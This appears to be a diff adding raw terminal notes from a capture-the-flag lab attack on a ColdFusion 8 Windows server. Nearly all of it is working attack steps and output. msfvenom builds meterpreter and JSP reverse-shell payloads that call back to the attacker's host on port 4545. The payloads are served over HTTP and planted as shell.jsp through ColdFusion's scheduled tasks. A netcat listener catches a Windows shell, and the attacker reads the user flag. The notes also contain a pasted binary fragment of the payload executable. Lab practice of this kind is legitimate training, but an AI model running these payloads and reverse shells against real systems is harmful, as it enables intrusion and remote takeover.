@@ -1,1 +1,80 @@
+hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4545 -f exe -o meterpreter.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: meterpreter.exe
+
+
+ There was an error running your scheduled task. Reasons for which scheduled tasks might fail include:
+
+    The scheduled task is paused
+    The URL is a redirection URL.
+    The URL is protected by IIS NT Challenge/Response or Apache .htaccess password. The Username and Password text fields for editing a scheduled task are intended to support Basic Authentication only.
+    The Domain Name lookup failed. Try using the IP address of the domain whenever possible.
+    The URL is an SSL site, but the SSL port was specified incorrectly.
+    The Web site is not responding.
+    The directory specified for published results does not exist.
+
+
+======
+
+This scheduled task was completed successfully.
+
+
+
+hippoeug@kali:~$ sudo python -m SimpleHTTPServer 80
+[sudo] password for hippoeug: 
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.14.15 - - [24/Jan/2021 14:59:21] "GET / HTTP/1.1" 200 -
+10.10.14.15 - - [24/Jan/2021 16:09:46] "GET / HTTP/1.1" 200 -
+10.10.14.15 - - [24/Jan/2021 16:16:42] "GET /meterpreter.exe HTTP/1.1" 200 -
+10.10.10.11 - - [24/Jan/2021 16:21:21] "GET /meterpreter.exe HTTP/1.1" 200 -
+
+
+hippoeug@kali:~$ nc -lvnp 4545
+listening on [any] 4545 ...
+
+
+
+C:\ColdFusion8\wwwroot\CFIDE\shell.jsp
+
+MZ???¸@Èº´ Í!¸LÍ!This program cannot be run in DOS mode. $9$Ý}E?}E?}E?Zƒ?~E?}E~?E?t=ê?|E?t=î?|E?Rich}E?PEd†}<ÆKð#0@@xBHÊƒ€BlpB0.textN `.rdata„0@@.fydhx@ àHƒì(IÇÁ@IÇÀ0HÇÂH3Éè'HÇÁH¾A@H‹øó¤?ÐH3ÉèPAYLOAD:Ì?%À?%²NB^B@0v00f0X0ExitProcessXVirtualAllocKERNEL32.dllüHƒäðèÌAQAPRQVH1?eH‹R`H‹RH‹R H‹rPH·JJM1ÉH1À¬
+
+
+
+
+hippoeug@kali:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4545 -f raw -o jsp_shell.jsp
+Payload size: 1497 bytes
+Saved as: jsp_shell.jsp
+
+hippoeug@kali:~$ sudo python -m SimpleHTTPServer 80
+[sudo] password for hippoeug: 
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.11 - - [24/Jan/2021 16:29:04] "GET /meterpreter.exe HTTP/1.1" 200 -
+10.10.10.11 - - [24/Jan/2021 16:30:05] "GET /jsp_shell.jsp HTTP/1.1" 200 -
+10.10.10.11 - - [24/Jan/2021 16:30:07] "GET /jsp_shell.jsp HTTP/1.1" 200 -
+
+
+
+http://10.10.10.11:8500/CFIDE/shell.jsp
+
+
+hippoeug@kali:~$ nc -lvnp 4545
+listening on [any] 4545 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.10.10.11] 50807
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\ColdFusion8\runtime\bin>
+
+
+
+
+C:\Users\tolis\Desktop>type user.txt
+type user.txt
+02650d3a69a70780c302e146a6cb96f3
+
+
 
